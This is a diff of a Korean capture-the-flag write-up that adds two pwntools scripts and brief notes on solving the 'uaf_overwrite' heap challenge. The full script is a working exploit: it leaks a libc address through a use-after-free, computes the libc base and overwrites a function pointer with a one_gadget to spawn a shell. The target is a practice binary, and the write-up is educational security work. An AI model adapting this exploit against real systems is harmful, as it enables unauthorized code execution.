@@ -288,13 +288,94 @@ pwntools로 확인해보면 주소가 나올 것이다.
 <br>
 
 ```python
+from pwn import *
 
+# p = remote('host3.dreamhack.games',)
+p = process('./uaf_overwrite')
+
+libc = ELF('./libc-2.27.so')
+e = ELF('./uaf_overwrite')
+
+# first chunk
+p.sendlineafter(b'> ',b'3')
+p.sendlineafter(b': ',b'1280')
+p.sendlineafter(b': ',b'A')
+p.sendlineafter(b': ',b'-1') # non-free
+
+# second chunk and free first chunk
+p.sendlineafter(b'> ',b'3')
+p.sendlineafter(b': ',b'1280')
+p.sendlineafter(b': ',b'A')
+p.sendlineafter(b': ',b'0')
+
+# leak
+p.sendlineafter(b'> ',b'3')
+p.sendlineafter(b': ',b'1280')
+p.sendlineafter(b': ',b'AAAAAAA')
+p.recvline()
+print(p.recvline())
 ```
 
 <br>
 
+흠.. 풀이를 보고 살짝 수정을 해서 풀었는데 시행착오가 있었다.
 
+먼저 leak 한 주소 값이 main_arena과의 오프셋이 로컬 환경과 서버 환경과 일치하는지였다.
 
+이 부분은 결론적으로는 로컬에서 구한 오프셋과 동일한 거 같은데, 이 오프셋은 내가 chunk 페이로드를 얼마나 주는지, 무슨 값으로 주는지에 따라 달라진다.
 
+내 코드로는 오프셋이 96이 나온다.
 
+<br>
 
+```python
+from pwn import *
+
+p = remote('host3.dreamhack.games', 22807)
+#p = process('./uaf_overwrite')
+libc = ELF('./libc-2.27.so')
+
+# first chunk
+p.sendlineafter(b'> ',b'3')
+p.sendlineafter(b': ',b'1280')
+p.sendlineafter(b': ',b'A')
+p.sendlineafter(b': ',b'-1') # non-free
+
+# second chunk
+p.sendlineafter(b'> ',b'3')
+p.sendlineafter(b': ',b'1280')
+p.sendlineafter(b': ',b'A')
+p.sendlineafter(b': ',b'0')
+
+# leak
+p.sendlineafter(b'> ',b'3')
+p.sendlineafter(b': ',b'1280')
+p.sendlineafter(b': ',b'AAAAAAA')
+p.recvline()
+
+main_arena_off = u64(p.recvline()[:-1]+ b'\x00\x00')
+print("main_arena_offset: ", hex(main_arena_off))
+p.sendlineafter(b': ', b'-1')
+
+libc_main_arena_offset = libc.symbols['__malloc_hook'] + 0x10 # 0x3ebc40
+
+libc_base = main_arena_off - libc_main_arena_offset - 0x60 # - 96
+
+print("libc: ", hex(libc_base))
+
+# overwrite Robot.fptr by onegadget 
+onegadget = [0x4f3d5, 0x4f432, 0x10a41c]
+
+payload = libc_base + 0x10a41c
+
+# send payload
+p.sendlineafter(b'> ', b'1')
+p.sendlineafter(b': ', b'1')
+p.sendlineafter(b': ', bytes(str(payload),'latin-1'))
+
+# get shell
+p.sendlineafter(b'> ', b'2')
+p.sendlineafter(b': ', b'1')
+
+p.interactive()
+```
